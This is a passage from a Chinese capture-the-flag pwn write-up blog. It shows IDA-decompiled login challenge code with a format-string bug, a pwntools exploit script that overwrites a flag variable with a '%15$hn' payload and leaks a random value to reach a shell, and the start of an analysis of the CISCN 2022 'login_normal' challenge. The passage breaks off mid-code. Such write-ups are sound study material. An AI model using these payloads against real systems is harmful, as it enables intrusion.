<span class="comment">// [esp-E2h] [ebp-130h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-DEh] [ebp-12Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-DAh] [ebp-128h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp-D6h] [ebp-124h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-D2h] [ebp-120h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp-CEh] [ebp-11Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp-CAh] [ebp-118h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp-C6h] [ebp-114h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp-C2h] [ebp-110h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp-BEh] [ebp-10Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp-BAh] [ebp-108h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp-B6h] [ebp-104h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp-B2h] [ebp-100h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp-A6h] [ebp-F4h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp-A2h] [ebp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp-9Ah] [ebp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp-96h] [ebp-E4h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp-92h] [ebp-E0h]</span></span><br><span class="line">  _DWORD v23[<span class="number">35</span>]; <span class="comment">// [esp-8Eh] [ebp-DCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp-2h] [ebp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> buf; <span class="comment">// [esp+2h] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [esp+6h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [esp+Ah] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Eh] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">16</span>]; <span class="comment">// [esp+12h] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">16</span>]; <span class="comment">// [esp+22h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [esp+32h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// [esp+42h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v32 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  dword_804C044 = <span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  buf %= <span class="number">0xF4240</span>u;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ciallo~(∠・ω&lt; )⌒☆, What is your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%15s&quot;</span>, format, v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;,PLAY Genshin Impact?(y or n)&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v24 + <span class="number">3</span>, <span class="number">1u</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(v24) == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;goodbye&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(fd, &amp;v26, <span class="number">4u</span>);</span><br><span class="line">    read(fd, s2, <span class="number">0xF</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter your account and password&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Account:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(</span><br><span class="line">      <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">      &amp;v27,</span><br><span class="line">      v18,</span><br><span class="line">      v19,</span><br><span class="line">      v23,</span><br><span class="line">      v20,</span><br><span class="line">      v21,</span><br><span class="line">      v22,</span><br><span class="line">      v23[<span class="number">0</span>],</span><br><span class="line">      v23[<span class="number">1</span>],</span><br><span class="line">      v23[<span class="number">2</span>],</span><br><span class="line">      v23[<span class="number">3</span>],</span><br><span class="line">      v23[<span class="number">4</span>],</span><br><span class="line">      v23[<span class="number">5</span>],</span><br><span class="line">      v23[<span class="number">6</span>],</span><br><span class="line">      v23[<span class="number">7</span>],</span><br><span class="line">      v23[<span class="number">8</span>],</span><br><span class="line">      v23[<span class="number">9</span>],</span><br><span class="line">      v23[<span class="number">10</span>],</span><br><span class="line">      v23[<span class="number">11</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(</span><br><span class="line">      <span class="string">&quot;%15s&quot;</span>,</span><br><span class="line">      s1,</span><br><span class="line">      v23[<span class="number">14</span>],</span><br><span class="line">      v23[<span class="number">15</span>],</span><br><span class="line">      v23[<span class="number">16</span>],</span><br><span class="line">      v23[<span class="number">17</span>],</span><br><span class="line">      v23[<span class="number">18</span>],</span><br><span class="line">      v23[<span class="number">19</span>],</span><br><span class="line">      v23[<span class="number">20</span>],</span><br><span class="line">      v23[<span class="number">21</span>],</span><br><span class="line">      v23[<span class="number">22</span>],</span><br><span class="line">      v23[<span class="number">23</span>],</span><br><span class="line">      v23[<span class="number">24</span>],</span><br><span class="line">      v23[<span class="number">25</span>],</span><br><span class="line">      v23[<span class="number">26</span>],</span><br><span class="line">      v23[<span class="number">27</span>],</span><br><span class="line">      v23[<span class="number">28</span>],</span><br><span class="line">      v23[<span class="number">29</span>],</span><br><span class="line">      v23[<span class="number">30</span>],</span><br><span class="line">      v23[<span class="number">31</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v27 == v26 &amp;&amp; !<span class="built_in">strcmp</span>(s1, s2) )        <span class="comment">// v26是随机数</span></span><br><span class="line">      dword_804C044 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dword_804C044 )                        <span class="comment">// 直接改这个为1</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Login is risky. The verification code has been sent to 151xxxx1916&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please enter the verification code:&quot;</span>);</span><br><span class="line">      ((<span class="type">void</span> (__stdcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">int</span> *, _DWORD, <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">int</span>))__isoc99_scanf)(</span><br><span class="line">        <span class="string">&quot;%d&quot;</span>,</span><br><span class="line">        &amp;v27,</span><br><span class="line">        v23[<span class="number">34</span>],</span><br><span class="line">        v24,</span><br><span class="line">        buf,</span><br><span class="line">        v26);</span><br><span class="line">      <span class="keyword">if</span> ( v27 == buf )                         <span class="comment">// buf是随机数</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Genshin Impact, start!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);                      <span class="comment">// getshell</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;verification code error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Account or password error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v32 != __readgsdword(<span class="number">0x14</span>u) )</span><br><span class="line">    sub_80494D0();</span><br><span class="line">  JUMPOUT(<span class="number">0x80494C5</span>);                           <span class="comment">// ret</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向并不难</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./start2&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./start2&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28161)</span></span><br><span class="line"><span class="comment"># def debug():</span></span><br><span class="line"><span class="comment">#     gdb.attach(p)</span></span><br><span class="line"><span class="comment">#     pause()</span></span><br><span class="line"></span><br><span class="line">pal=p32(<span class="number">0x0804C044</span>)+<span class="string">b&#x27;%15$hn&#x27;</span>+<span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What is your name?\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">data=p.recvuntil(<span class="string">b&quot;,P&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">5</span>:]</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;LAY Genshin Impact?(y or n)\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter your account and password\n&#x27;</span>,<span class="string">b&#x27;1\na&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please enter the verification code:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">int</span>(data,<span class="number">16</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这样就打通了。。&#x2F;&#x2F;</p><h3 id="如何解决ida7-7反编译不了"><a href="#如何解决ida7-7反编译不了" class="headerlink" title="如何解决ida7.7反编译不了"></a>如何解决ida7.7反编译不了</h3><p>之后去问了菜哥，他的8.3ida是反编译得了的，然后提示信息是<code>0x80493A9</code>上栈帧出了问题，而我们undefine掉ret会发现scanf的参数十分的多，这就是问题所在了（以前一直以为是常态），因此到scanf点击y，将参数改成两个就可以成功反编译了<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115401.png" alt="image-20240514185748987"></p><p>这样就可以成功了<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115402.png" alt="image-20240514185809655"></p><p>可以看到成功的代码就是如此的赏心悦目</p><h1 id="CISCN-2022-初赛-login-normal"><a href="#CISCN-2022-初赛-login-normal" class="headerlink" title="[CISCN 2022 初赛]login_normal"></a>[CISCN 2022 初赛]login_normal</h1><p>本题的漏洞点不难，只是逆向要花点时间</p><h2 id="静态分析-3"><a href="#静态分析-3" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    sub_FFD(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是读点数据，然后传参</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_FFD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *ptr2; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*ptr || *ptr != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*ptr != <span class="string">&#x27;\r&#x27;</span> || ptr[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">      *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    ptr = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">      *ptr++ = <span class="number">0</span>;</span><br><span class="line">    ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  *ptr = <span class="number">0</span>;</span><br><span class="line">  sa = (<span class="type">char</span> *)(ptr + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      sub_DA8(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      sub_CBD(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一串代码看着让人怀疑人生，因此分段分析，主要分为3部分，1：初始化，2：判断字符串格式并将相应位置的值传进去，3：便是switch，功能函数</p><h3 id="判断字符串格式"><a href="#判断字符串格式" class="headerlink" title="判断字符串格式"></a>判断字符串格式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( !*ptr || *ptr != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*ptr != <span class="string">&#x27;\r&#x27;</span> || ptr[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">        qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// 找到：之后的数据</span></span><br><span class="line">        *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">        qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    ptr = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">        *ptr++ = <span class="number">0</span>;</span><br><span class="line">    ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      